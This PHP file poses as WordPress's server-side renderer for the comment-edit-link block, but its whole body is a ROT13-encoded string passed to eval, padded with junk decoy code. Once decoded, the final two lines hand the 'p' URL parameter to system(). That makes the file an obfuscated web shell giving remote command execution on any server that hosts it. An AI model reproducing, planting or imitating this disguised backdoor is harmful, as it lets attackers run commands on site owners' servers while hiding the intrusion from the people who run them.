<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzrag-rqvg-yvax` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzrag-rqvg-yvax` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Erghea gur cbfg pbzzrag'f qngr.
 */
shapgvba eraqre_oybpx_pber_pbzzrag_rqvg_yvax( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['pbzzragVq'] ) || ! pheerag_hfre_pna( 'rqvg_pbzzrag', $oybpx->pbagrkg['pbzzragVq'] ) ) {
		erghea '';
	}

	$rqvg_pbzzrag_yvax = trg_rqvg_pbzzrag_yvax( $oybpx->pbagrkg['pbzzragVq'] );

	$yvax_nggf = '';

	vs ( ! rzcgl( $nggevohgrf['yvaxGnetrg'] ) ) {
		$yvax_nggf .= fcevags( 'gnetrg=\"%f\"', rfp_ngge( $nggevohgrf['yvaxGnetrg'] ) );
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags(
		'<qvi %1$f><n uers=\"%2$f\" %3$f>%4$f</n></qvi>',
		$jenccre_nggevohgrf,
		rfp_hey( $rqvg_pbzzrag_yvax ),
		$yvax_nggf,
		rfp_ugzy__( 'Rqvg' )
	);
}

/**
 * Ertvfgref gur `pber/pbzzrag-rqvg-yvax` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzrag_rqvg_yvax() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzrag-rqvg-yvax',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzrag_rqvg_yvax',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzrag_rqvg_yvax' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>